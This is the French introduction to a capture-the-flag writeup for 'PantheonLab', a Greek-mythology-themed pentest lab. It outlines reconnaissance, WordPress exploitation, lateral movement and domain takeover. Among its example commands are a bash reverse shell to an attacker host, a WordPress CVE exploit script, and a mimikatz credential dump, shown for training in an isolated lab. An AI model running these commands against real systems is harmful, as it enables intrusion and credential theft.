# Introduction au Writeup

## 🎯 Objectif du Lab

Ce writeup détaille la résolution complète du lab PantheonLab, un environnement de pentest inspiré de la mythologie grecque. L'objectif est de démontrer une méthodologie complète d'audit de sécurité, de l'énumération initiale jusqu'à l'obtention des privilèges administrateur.

## 🏛️ Contexte du Scénario

Dans l'univers de PantheonLab, les dieux de l'Olympe ont modernisé leur royaume en adoptant les technologies numériques. Cependant, cette transition a introduit des vulnérabilités que nous devons identifier et exploiter pour sécuriser le Panthéon numérique.

### Machines Cibles

| Machine | IP | Rôle | Point d'Entrée |
|---------|----|------|----------------|
| **Olympe** | 192.168.56.10 | Serveur Linux/WordPress | ✅ Principal |
| **DC01** | 192.168.56.11 | Contrôleur de domaine | 🔒 Objectif final |
| **Enfers** | 192.168.56.12 | Serveur membre | 🔒 Lateral movement |

## 🔍 Méthodologie d'Attaque

### Phase 1 : Reconnaissance
- **Énumération réseau** : Découverte des machines et services
- **Énumération web** : Analyse du site WordPress
- **Recherche de vulnérabilités** : Identification des vecteurs d'attaque

### Phase 2 : Exploitation Initiale
- **Exploitation WordPress** : Bypass d'authentification
- **Obtenir un shell** : Accès initial sur Olympe
- **Élévation de privilèges** : Accès utilisateur hermes

### Phase 3 : Lateral Movement
- **Énumération Active Directory** : Découverte du domaine
- **Exploitation des credentials** : Utilisation des comptes trouvés
- **Accès aux machines Windows** : Pivot vers DC01 et Enfers

### Phase 4 : Persistence et Privilèges
- **Escalade de privilèges** : Obtenir l'accès administrateur
- **DCSync** : Extraction des hashes du domaine
- **Golden Ticket** : Contrôle total du domaine

## 🛠️ Outils Utilisés

### Énumération
```bash
# Réseau
nmap -sC -sV -p- 192.168.56.10

# Web
wpscan --url http://192.168.56.10 --plugins-detection aggressive
gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt

# Active Directory
nxc smb 192.168.56.11 -u user -p pass --shares
bloodhound-python -d pantheon.god -u user -p pass -c All
```

### Exploitation
```bash
# WordPress
python3 CVE-2025-32118.py -u http://192.168.56.10 -un hermes -p mondieu

# Reverse Shell
bash -c 'bash -i >& /dev/tcp/192.168.56.1/9001 0>&1'

# Active Directory
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

## 📊 Progression Attendue

### Niveau 1 : Accès Initial
- [x] Énumération du réseau
- [x] Découverte du site WordPress
- [x] Identification de la vulnérabilité CMP Coming Soon
- [x] Exploitation et obtention d'un shell

### Niveau 2 : Élévation de Privilèges
- [x] Accès utilisateur hermes
- [x] Découverte des credentials SMB
- [x] Accès au domaine Active Directory

### Niveau 3 : Lateral Movement
- [ ] Énumération complète du domaine
- [ ] Découverte des utilisateurs et groupes
- [ ] Exploitation des vulnérabilités Kerberos

### Niveau 4 : Contrôle Total
- [ ] Escalade vers administrateur
- [ ] DCSync du domaine
- [ ] Création de Golden Ticket

## 🎭 Thématique Mythologique

Chaque étape du writeup correspond à une rencontre avec les dieux de l'Olympe :

### Hermès - Le Messager
- **Vulnérabilité** : Credentials faibles (hermes:y)
- **Scénario** : Intercepter les messages divins
- **Technique** : Brute force, exploitation WordPress

### Zeus - Le Roi des Dieux
- **Vulnérabilité** : Contrôleur de domaine
- **Scénario** : Détrôner le roi de l'Olympe
- **Technique** : DCSync, Golden Ticket

### Héra - La Reine Jalouse
- **Vulnérabilité** : Politiques de sécurité
- **Scénario** : Contourner la surveillance divine
- **Technique** : Bypass des politiques, audit evasion

## ⚠️ Avertissements Importants

!!! warning "Environnement Contrôlé"
    Ce lab est conçu pour l'apprentissage dans un environnement isolé. Ne jamais tester ces techniques sur des systèmes de production sans autorisation.

!!! info "Légalité"
    L'utilisation de ces techniques doit toujours respecter les lois locales et les autorisations appropriées.

!!! tip "Bonnes Pratiques"
    Documentez chaque étape, prenez des captures d'écran, et comprenez le "pourquoi" derrière chaque technique.

## 🎯 Objectifs d'Apprentissage

### Compétences Techniques
- **Énumération web avancée** : WordPress, plugins, vulnérabilités
- **Exploitation Active Directory** : Kerberos, DCSync, Golden Ticket
- **Lateral movement** : Pivot entre machines
- **Privilege escalation** : Windows et Linux

### Compétences Méthodologiques
- **Approche structurée** : Méthodologie de pentest
- **Documentation** : Writeup professionnel
- **Résolution de problèmes** : Debugging et troubleshooting
- **Pensée critique** : Analyse des vulnérabilités

## 📚 Ressources Complémentaires

### Documentation Technique
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks Active Directory](https://book.hacktricks.xyz/pentesting/pentesting-active-directory)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)

### Outils et Scripts
- [PowerView](https://github.com/PowerShellMafia/PowerSploit)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)

---

*Prêt à commencer votre quête dans l'Olympe numérique ? Que la sagesse d'Athéna vous guide dans cette aventure épique !* ⚡🏛️ 